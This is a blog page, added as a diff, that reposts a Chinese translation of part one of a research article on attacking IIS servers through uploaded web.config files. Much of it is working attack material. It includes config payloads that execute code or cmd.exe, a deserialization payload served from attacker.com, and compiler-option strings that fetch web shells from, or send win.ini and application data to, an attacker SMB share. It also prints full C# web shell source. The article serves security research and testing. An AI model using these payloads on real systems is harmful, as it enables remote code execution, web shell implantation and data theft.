@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="引言  这是我撰写的第二篇分析web.config安全问题的文章。早在2014年[1]的时候，我们撰写过一篇这方面的文章，其中介绍了一种运行ASP经典代码的方法，以及如何仅通过上传web.config文件发动存储型XSS攻击。 在这篇文章中，我们将着眼于运行web.config文件本身，以及在把web.config上传到IIS服务器上的应用程序过程中可以派上用场的其他技术。这里的主要目标">
+<meta property="og:type" content="article">
+<meta property="og:title" content="深入分析web.config上传方面的安全问题（上） -">
+<meta property="og:url" content="https://westlake2014.github.io/2019/09/19/2019-09-19~5fb3a5613c92213568a1fe26afd0379b/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="引言  这是我撰写的第二篇分析web.config安全问题的文章。早在2014年[1]的时候，我们撰写过一篇这方面的文章，其中介绍了一种运行ASP经典代码的方法，以及如何仅通过上传web.config文件发动存储型XSS攻击。 在这篇文章中，我们将着眼于运行web.config文件本身，以及在把web.config上传到IIS服务器上的应用程序过程中可以派上用场的其他技术。这里的主要目标">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://www.4hou.com/uploads/20190908/1567945604220150.png">
+<meta property="og:image" content="https://www.4hou.com/uploads/20190908/1567945761475609.png">
+<meta property="og:updated_time" content="2019-09-20T03:15:17.369Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="深入分析web.config上传方面的安全问题（上） -">
+<meta name="twitter:description" content="引言  这是我撰写的第二篇分析web.config安全问题的文章。早在2014年[1]的时候，我们撰写过一篇这方面的文章，其中介绍了一种运行ASP经典代码的方法，以及如何仅通过上传web.config文件发动存储型XSS攻击。 在这篇文章中，我们将着眼于运行web.config文件本身，以及在把web.config上传到IIS服务器上的应用程序过程中可以派上用场的其他技术。这里的主要目标">
+<meta name="twitter:image" content="https://www.4hou.com/uploads/20190908/1567945604220150.png">
+  <link rel="canonical" href="https://westlake2014.github.io/2019/09/19/2019-09-19~5fb3a5613c92213568a1fe26afd0379b/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>深入分析web.config上传方面的安全问题（上） - | Hexo</title>
+  <meta name="generator" content="Hexo 3.9.0">
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+  </ul>
+
+    
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://westlake2014.github.io/2019/09/19/2019-09-19~5fb3a5613c92213568a1fe26afd0379b/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="westlake2014">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">深入分析web.config上传方面的安全问题（上） -
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2019-09-19 00:00:00 / Modified: 23:15:17" itemprop="dateCreated datePublished" datetime="2019-09-19T00:00:00-04:00">2019-09-19</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <div id="readability-page-1" class="page">
+
+<div>
+
+<p><span> <strong>引言</strong> </span></p>
+<p>这是我撰写的第二篇分析web.config安全问题的文章。早在2014年<br><a href="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/" target="_blank" rel="noopener">[1]</a><br>的时候，我们撰写过一篇这方面的文章，其中介绍了一种运行ASP经典代码的方法，以及如何仅通过上传web.config文件发动存储型XSS攻击。</p>
+<p>在这篇文章中，我们将着眼于运行web.config文件本身，以及在把web.config上传到IIS服务器上的应用程序过程中可以派上用场的其他技术。这里的主要目标，是使用web.config文件在服务器上执行代码或命令，以及针对存储型XSS的其他攻击技术。</p>
+<p>本文中描述的技术可以分为两大类，具体取决于它们是否可以在应用程序根目录或子文件夹/虚拟目录中上传web.config文件。如果您不熟悉涉及IIS的虚拟目录和应用程序等术语的话，请参阅文献<br><a href="https://docs.microsoft.com/en-us/iis/get-started/planning-your-iis-architecture/understand<a id="more"></a>ing-sites-applications-and-virtual-directories-on-iis" target="_blank" rel="noopener">[2]</a><br>。此外，我撰写的另一篇文章<br><a href="https://soroush.secproject.com/blog/2019/07/iis-application-vs-folder-detection-during-blackbox-testing/" target="_blank" rel="noopener">[3]</a><br>，对于在黑盒评估期间识别虚拟目录或应用程序也是非常有用的，大家不妨读一下。</p>
+<p><span> <strong>1. 使用根目录或应用程序目录中的web.config执行命令</strong> </span></p>
+<p>当一个应用程序已经使用了一个将要被我们的web.config文件替换的web.config文件，而我们的web.config文件又没有进行正确的设置的时候——例如数据库连接字符串或一些有效的程序集引用等，这种方法将会带来巨大的破坏性。当应用程序可能使用了将要替换的web.config文件时，建议不要在实际网站上尝试这种技术。对于位于其他应用程序或虚拟目录中的IIS应用程序来说，由于它们很可能并不使用web.config文件，因此，通常要比位于网站的根目录中的程序要更安全一些。下图展示的是位于testwebconfig应用程序内部的示例应用程序anotherapp，它也位于Default<br>Web Site目录中。</p>
+<p><img src="https://www.4hou.com/uploads/20190908/1567945604220150.png" alt="1.png" title="1567945604220150.png"></p>
+<p>如果可以修改应用程序根目录中的web.config文件的话，攻击者就可以通过各种方法在服务器上执行命令。</p>
+<p>在本文中，我们将为读者介绍四个有趣的相关例子，具体如下所示。</p>
+<p><strong>1.1. 将web.config作为ASPX页面执行</strong></p>
+<p>这与文献<br><a href="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/" target="_blank" rel="noopener">[1]</a><br>中的例子非常相似，不过，在应用程序的根目录中上传web.config文件的好处是，我们能够得到更多的控制权，因此，我们可以使用托管处理程序将web.config文件作为ASPX页面运行，具体如下所示：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+    &lt;system.webServer&gt;
+        &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
+            &lt;add name=&quot;web_config&quot; path=&quot;web.config&quot; verb=&quot;*&quot; type=&quot;System.Web.UI.PageHandlerFactory&quot; modules=&quot;ManagedPipelineHandler&quot; requireAccess=&quot;Script&quot; preCondition=&quot;integratedMode&quot; /&gt;
+            &lt;add name=&quot;web_config-Classic&quot; path=&quot;web.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll&quot; requireAccess=&quot;Script&quot; preCondition=&quot;classicMode,runtimeVersionv4.0,bitness64&quot; /&gt;
+        &lt;/handlers&gt;
+        &lt;security&gt;
+            &lt;requestFiltering&gt;
+                &lt;fileExtensions&gt;
+                    &lt;remove fileExtension=&quot;.config&quot; /&gt;
+                &lt;/fileExtensions&gt;
+                &lt;hiddenSegments&gt;
+                    &lt;remove segment=&quot;web.config&quot; /&gt;
+                &lt;/hiddenSegments&gt;
+            &lt;/requestFiltering&gt;
+        &lt;/security&gt;
+        &lt;validation validateIntegratedModeConfiguration=&quot;false&quot; /&gt;
+    &lt;/system.webServer&gt;
+    &lt;system.web&gt;
+        &lt;compilation defaultLanguage=&quot;vb&quot;&gt;
+            &lt;buildProviders&gt; &lt;add extension=&quot;.config&quot; type=&quot;System.Web.Compilation.PageBuildProvider&quot; /&gt; &lt;/buildProviders&gt;
+        &lt;/compilation&gt;
+        &lt;httpHandlers&gt;
+            &lt;add path=&quot;web.config&quot; type=&quot;System.Web.UI.PageHandlerFactory&quot; verb=&quot;*&quot; /&gt;
+        &lt;/httpHandlers&gt;
+    &lt;/system.web&gt;
+&lt;/configuration&gt;
+&lt;!-- ASP.NET code comes here! It should not include HTML comment closing tag and double dashes!
+&lt;%
+Response.write(&quot;-&quot;&amp;amp;&quot;-&gt;&quot;)
+&apos; it is running the ASP code if you can see 3 by opening the web.config file!
+Response.write(1+2)
+Response.write(&quot;&lt;!-&quot;&amp;amp;&quot;-&quot;)
+%&gt;
+--&gt;</code></pre><p>然后，只要浏览该web.config文件，系统就会将其作为ASP.NET页面来运行。显然，相关的XML内容也可以从网上进行访问。实际上，如果使用具有.config、.jpg或.txt文件等扩展名的文件来完成上传的话，也许会更容易一些，因为这些带有这些扩展名的文件一般都能畅通无阻；完成上传之后，我们就可以将其作为.aspx页面来运行了。</p>
+<p><strong>1.2. 通过AspNetCoreModule模块来运行命令</strong></p>
+<p>除此之外，我们也可以使用ASP.NET Core模块来运行命令，具体如下所示：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;configuration&gt;
+    &lt;system.webServer&gt;
+      &lt;handlers&gt;
+        &lt;remove name=&quot;aspNetCore&quot; /&gt;
+         &lt;add name=&quot;aspNetCore&quot; path=&quot;backdoor.me&quot; verb=&quot;*&quot; modules=&quot;AspNetCoreModule&quot; resourceType=&quot;Unspecified&quot; /&gt;
+      &lt;/handlers&gt;
+      &lt;aspNetCore processPath=&quot;cmd.exe&quot; arguments=&quot;/c calc&quot;/&gt;
+    &lt;/system.webServer&gt;
+&lt;/configuration&gt;</code></pre><p>浏览backdoor.me页面时，上述命令就会被执行，重要的是，这里不要求该页面位于服务器上！<br>这里可以使用powershell命令作为反向shell。</p>
+<p><strong>1.3. 使用机器密钥</strong></p>
+<p>如文献<br><a href="https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/" target="_blank" rel="noopener">[4]</a><br>所述，可以在web.config文件中设置machineKey元素，以便利用反序列化功能在服务器上运行相关的代码和命令。</p>
+<p><strong>1.4. 使用json_appservice.axd</strong></p>
+<p>这是在.NET Framework的身份验证过程中使用已知的反序列化漏洞在服务器上悄咪咪地运行代码的一种好方法（有关详细信息，请参阅文献<br><a href="https://www.nccgroup.trust/uk/our-research/use-of-deserialisation-in-.net-framework-methods-and-classes/" target="_blank" rel="noopener">[5]</a><br>)。</p>
+<pre><code>In this case, the web.config file can look like this:
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+    &lt;system.web.extensions&gt;
+        &lt;scripting&gt;
+            &lt;webServices&gt;
+                &lt;authenticationService enabled=&quot;true&quot; requireSSL=&quot;false&quot; /&gt; 
+            &lt;/webServices&gt;
+        &lt;/scripting&gt;
+    &lt;/system.web.extensions&gt;
+
+    &lt;appSettings&gt;
+        &lt;add key=&quot;aspnet:UseLegacyClientServicesJsonHandling&quot; value=&quot;true&quot; /&gt;
+    &lt;/appSettings&gt;
+
+    &lt;system.web&gt;
+        &lt;membership defaultProvider=&quot;ClientAuthenticationMembershipProvider&quot;&gt;
+            &lt;providers&gt;
+                &lt;add name=&quot;ClientAuthenticationMembershipProvider&quot; type=&quot;System.Web.ClientServices.Providers.ClientFormsAuthenticationMembershipProvider, System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot; serviceUri=&quot;http://attacker.com/payload?&quot; /&gt;
+            &lt;/providers&gt;
+        &lt;/membership&gt;
+    &lt;/system.web&gt;
+&lt;/configuration&gt;</code></pre><p>下面的JSON显示的是攻击者网站（<a href="http://attacker.com/payload）上可以接受POST请求的payload页面：" target="_blank" rel="noopener">http://attacker.com/payload）上可以接受POST请求的payload页面：</a></p>
+<pre><code>{
+    &apos;__type&apos;:&apos;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&apos;,
+    &apos;MethodName&apos;:&apos;Start&apos;,
+    &apos;ObjectInstance&apos;:{
+        &apos;__type&apos;:&apos;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&apos;,
+        &apos;StartInfo&apos;: {
+            &apos;__type&apos;:&apos;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&apos;,
+            &apos;FileName&apos;:&apos;cmd&apos;,
+            &apos;Arguments&apos;:&apos;/c calc&apos;
+        }
+    }
+}</code></pre><p>上传web.config文件并在远程服务器上安装payload页面后，攻击者可以发送如下所示的HTTP请求，从而在服务器上运行其代码和命令：</p>
+<pre><code>POST /testwebconfig/Authentication_JSON_AppService.axd/login HTTP/1.1
+Host: victim.com
+Content-Length: 72
+Content-Type: application/json;charset=UTF-8
+
+{&quot;userName&quot;:&quot;foo&quot;,&quot;password&quot;:&quot;bar&quot;,&quot;createPersistentCookie&quot;:false}</code></pre><p>需要注意的是，有时Profile_JSON_AppService.axd或Role_JSON_AppService.axd在这里也能派上用场，但是需要在web.config中启用它们，并且还得通过调用适当的方法来触发反序列化过程。</p>
+<p><span> <strong>2. 使用子文件夹/虚拟目录中的web.config来执行命令</strong> </span></p>
+<p>与应用程序文件夹所在根目录中的web.config文件相比，虚拟目录中的web.config文件受到的限制要更大一些。我们知道，web.config文件中的某些部分或属性是可用于执行AspNetCoreModule、machineKey、buildProviders和httpHandler等命令的，但是对于子文件夹中的web.config文件来说，则完全不是这么回事。</p>
+<p>在文献[1]中，我介绍了一种自己发现的方法，当系统允许在虚拟目录中使用ISAPI模块时，可以通过该方法将web.config文件作为ASP文件运行：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+   &lt;system.webServer&gt;
+      &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
+         &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;      
+      &lt;/handlers&gt;
+      &lt;security&gt;
+         &lt;requestFiltering&gt;
+            &lt;fileExtensions&gt;
+               &lt;remove fileExtension=&quot;.config&quot; /&gt;
+            &lt;/fileExtensions&gt;
+            &lt;hiddenSegments&gt;
+               &lt;remove segment=&quot;web.config&quot; /&gt;
+            &lt;/hiddenSegments&gt;
+         &lt;/requestFiltering&gt;
+      &lt;/security&gt;
+   &lt;/system.webServer&gt;
+&lt;/configuration&gt;
+&lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+&lt;%
+Response.write(&quot;-&quot;&amp;amp;&quot;-&gt;&quot;)
+&apos; it is running the ASP code if you can see 3 by opening the web.config file!
+Response.write(1+2)
+Response.write(&quot;&lt;!-&quot;&amp;amp;&quot;-&quot;)
+%&gt;
+--&gt;</code></pre><p>其他模块（例如用于PHP的模块）也可以类似的方式加以运行，只要被允许的话。但是，如果IIS应用程序配置的当的话，通常是不允许运行除.NET代码之外的任何代码的。为了解决这个问题，后面将介绍更多的相关技术。</p>
+<p><strong>2.1. 滥用compilerOptions属性</strong></p>
+<p>这里将web.config文件作为基本模板：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+    &lt;system.web&gt;
+        &lt;httpRuntime targetFramework=&quot;4.67.1&quot;/&gt;
+        &lt;compilation tempDirectory=&quot;&quot; debug=&quot;True&quot; strict=&quot;False&quot; explicit=&quot;False&quot; batch=&quot;True&quot;
+            batchTimeout=&quot;900&quot; maxBatchSize=&quot;1000&quot; maxBatchGeneratedFileSize=&quot;1000&quot; numRecompilesBeforeAppRestart=&quot;15&quot;
+            defaultLanguage=&quot;c#&quot; targetFramework=&quot;4.0&quot; urlLinePragmas=&quot;False&quot; assemblyPostProcessorType=&quot;&quot;&gt;
+
+            &lt;assemblies&gt;
+
+            &lt;/assemblies&gt;
+
+            &lt;expressionBuilders&gt;
+
+            &lt;/expressionBuilders&gt;
+
+            &lt;compilers&gt;
+                &lt;compiler language=&quot;c#&quot;
+                    extension=&quot;.cs;.config&quot;
+                    type=&quot;Microsoft.CSharp.CSharpCodeProvider,System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;
+                    warningLevel=&quot;4&quot;
+                    compilerOptions=&apos;&apos;/&gt;
+            &lt;/compilers&gt;
+        &lt;/compilation&gt;
+    &lt;/system.web&gt;
+    &lt;system.webServer&gt;
+        &lt;handlers&gt;
+            &lt;add name=&quot;web_config&quot; path=&quot;web.config&quot; verb=&quot;*&quot; type=&quot;System.Web.UI.PageHandlerFactory&quot; resourceType=&quot;File&quot; requireAccess=&quot;Script&quot; preCondition=&quot;integratedMode&quot; /&gt;
+        &lt;/handlers&gt;
+        &lt;security&gt;
+            &lt;requestFiltering&gt;
+                &lt;hiddenSegments&gt;
+                    &lt;remove segment=&quot;web.config&quot; /&gt;
+                &lt;/hiddenSegments&gt;
+                &lt;fileExtensions&gt;
+                    &lt;remove fileExtension=&quot;.config&quot; /&gt;
+                &lt;/fileExtensions&gt;
+            &lt;/requestFiltering&gt;
+        &lt;/security&gt;
+    &lt;/system.webServer&gt;
+&lt;/configuration&gt;</code></pre><p>我们可以将compiler元素的type属性设置为以下默认类型之一（注意，版本可以修改的）：</p>
+<pre><code>C#:
+
+Microsoft.CSharp.CSharpCodeProvider,System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</code></pre><p>我们使用csc.exe命令进行编译。</p>
+<p>VB.NET (这里以版本2为例进行说明 :</p>
+<pre><code>Microsoft.VisualBasic.VBCodeProvider, System, Version=2.0.3600.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</code></pre><p>这里使用vbc.exe命令进行编译。</p>
+<pre><code>Jscript.NET:
+
+Microsoft.JScript.JScriptCodeProvider, Microsoft.JScript, Version=7.0.3300.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</code></pre><p>这里使用jsc.exe命令进行编译。</p>
+<p>这些命令通常可以从.NET文件夹中找到。对于.NET v4来说，该文件夹位于：</p>
+<pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\</code></pre><p>上面的web.config模板文件中的compilerOptions属性的值将作为参数添加到编译器命令中。此外，我们还可以通过空格字符提供多个参数。</p>
+<p>如果没有为编译器命令提供选项，compilerOptions属性的值将被视为要编译的编译器的文件名。</p>
+<p>字符#用于终止命令，字符@用于加载另一个文件，详情请参阅文献[6]。</p>
+<p>如果我们能在编译一个C#、VB.NET或Jscript.NET文件时找到一个执行命令的方法，我们就可以通过编译一个额外的文件(可能来自远程共享驱动器或以前上传的静态文件)来轻松完成攻击过程。遗憾的是，我至今尚未找到这样的方法。如果读者了解相关的技巧的话，请一定告诉我，好让我将它们添加到这里！</p>
+<p>重要注意事项：如果ASP.NET页面位于web.config文件的上传文件夹中，那么当我们修改编译过程后，它们将无法使用我在这里提供的示例。因此，如果您只有一次上传web.config文件的机会，并且无法再次重写该文件，那么除非您对自己的方法有绝对的把握，并否则绝对不要对无法安全上传到空文件夹中的生产应用程序以身犯险。</p>
+<p><strong>2.1.1. 创建Web shell</strong></p>
+<p>以下字符串显示的是compilerOptions属性，该属性可用于在Web目录中创建包含二进制数据的Web shell：</p>
+<pre><code>/resource:&quot;\\KaliBoxIP\Public\webshell.txt&quot; /out:&quot;C:\appdata\wwwroot\myapp\webshell.aspx&quot; #</code></pre><p>使用上述设置浏览web.config文件后，系统会在请求的路径中创建一个名为webshell.aspx的二进制文件。就这里来说，了解服务器上的应用程序路径是非常重要的。为此，可以设法触发一个引起ASP.NET黄屏死机（YSOD）的错误，这样就能在相关的错误消息中看到应用程序的路径。当然，我们建议在另一个文件（而非web.config文件本身）中创建一个错误，这样的话，以后可以修改它，而会不影响web.config文件：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration&gt;
+    &lt;system.web&gt;
+        &lt;customErrors mode=&quot;Off&quot; /&gt;
+        IDontExist!
+    &lt;/system.web&gt;
+&lt;/configuration&gt;</code></pre><p>此外，要想进行正常的编译，我们应该在web.config文件的上传目录之外创建Web shell，除非创建Web<br>shell之后，还能修改web.config文件并删除compilerOptions属性。</p>
+<p>应该注意的是，webshell.txt中的代码将嵌入到包含二进制数据的webshell.aspx中。由于它不是这个webshell的干净副本，因此，可以用于获取访问权限的第一阶段代码。</p>
+<p>如果无法访问SMB的话，我们该怎么办呢？</p>
+<p>如果目标无法通过SMB进行通信，则可以使用具有允许的扩展名的文件来上传Web shell，并将其存放到/resource选项中：</p>
+<pre><code>/resource:&quot;C:\appdata\wwwroot\myapp\attachment\myshell.config&quot; /out:&quot;C:\appdata\wwwroot\myapp\webshell.aspx&quot; #</code></pre><p><strong>2.1.2. 接管现有的ASPX文件</strong></p>
+<p>当ASPX文件位于web.config文件的上传文件夹中时，就可以通过修改编译过程来接管该文件。</p>
+<p>应用程序和虚拟目录的知识对使用这种技术来说是非常重要的，下面我们举例说明：</p>
+<p>这里假设web.config文件被上传到了C:\appdata\wwwroot\myapp\attachment\文件夹中，而file.aspx也恰好位于同一个文件夹中，并可通过以下URL进行访问：</p>
+<pre><code>https://victim.com/myapp/attachment/file.aspx</code></pre><p>现在，我们就可以使用以下编译器选项来接管该文件了：</p>
+<pre><code>\\KaliBoxIP\Public\webshellcs.txt #</code></pre><p>或</p>
+<pre><code>&quot;C:\appdata\wwwroot\myapp\attachment\webshellcs.txt&quot; #</code></pre><p>webshellcs.txt文件的内容如下所示：</p>
+<pre><code>namespace ASP
+{
+    using System;
+    [System.Runtime.CompilerServices.CompilerGlobalScopeAttribute()]
+    public class attachment_file_aspx : global::System.Web.UI.Page, System.Web.IHttpHandler
+    {
+        private void @__Render__control1(System.Web.UI.HtmlTextWriter @__w, System.Web.UI.Control parameterContainer)
+        {
+            if (!String.IsNullOrEmpty(Request[&quot;cmd&quot;]))
+            {
+                System.Diagnostics.Process process = new System.Diagnostics.Process();
+                process.StartInfo.FileName = Request[&quot;cmd&quot;];
+                process.StartInfo.Arguments = Request[&quot;arg&quot;];
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.StartInfo.RedirectStandardError = true;
+                process.Start();
+                //* Read the output (or the error)
+                string output = process.StandardOutput.ReadToEnd();
+                @__w.Write(&quot;Result:&lt;br&gt;&lt;pre&gt;&quot;);
+                @__w.Write(output);
+            }
+            else
+            {
+                @__w.Write(&quot;Use:\&quot;?cmd=cmd.exe&amp;amp;arg=/c dir\&quot; as an example!&quot;);
+            }
+        }
+
+        [System.Diagnostics.DebuggerNonUserCodeAttribute()]
+        protected override void FrameworkInitialize()
+        {
+            this.SetRenderMethodDelegate(new System.Web.UI.RenderMethod([email protected]__Render__control1));
+        }
+    }
+}</code></pre><p><strong>2.1.3. 窃取内部文件</strong></p>
+<p>下面的字符串展示的是compilerOptions属性：</p>
+<pre><code>/resource:c:\windows\win.ini /out:\\KaliBoxIP\Public\test.bin</code></pre><p>这样的话，一旦打开上传文件夹中现有的ASP.NET页面，就会在含有win.ini文件的共享文件夹中生成test.pdb和test.bin文件。这对于窃取应用程序的web.config文件尤其有用，因为它可能存有敏感数据，例如可能导致远程代码执行的机器密钥[4]等。</p>
+<p><strong>2.1.4. 窃取与该应用相关的更多数据</strong></p>
+<p>以下字符串显示的是compilerOptions属性：</p>
+<pre><code>/resource:\\KaliBoxIP\Public\test.txt -bugreport:\\KaliBoxIP\Public\foobar1.txt /errorreport:none</code></pre><p>在该文件夹中打开现有ASP.NET页面后，会在共享路径上创建一个大文件，该文件可能包含与该应用程序及其底层技术相关的敏感数据。</p>
+<p><img src="https://www.4hou.com/uploads/20190908/1567945761475609.png" alt="1.png" title="1567945761475609.png"></p>
+<p>显然，当路径已知并且可以远程下载文件时，我们也可以在同一Web服务器上创建该文件。</p>
+<p>（未完待续）</p>
+</div>
+
+</div>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/09/19/2019-09-19~3e2edfd6534e6566455d53083ebff55b/" rel="prev" title="Webmin">
+                  Webmin <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">westlake2014</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
